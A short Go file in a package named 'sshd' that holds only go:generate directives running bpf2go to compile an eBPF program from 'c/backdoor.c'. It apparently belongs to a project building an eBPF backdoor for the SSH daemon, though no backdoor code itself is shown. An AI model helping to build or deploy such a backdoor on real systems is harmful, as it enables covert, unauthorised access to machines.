// generated package contains auto compiled eBPF byte code.
package sshd

// $BPF_CLANG and $BPF_CFLAGS are set by the Makefile.
////go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc $BPF_CLANG -cflags $BPF_CFLAGS bpf ./c/backdoor.c -- -I ../headers
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf ./c/backdoor.c -- -I../headers
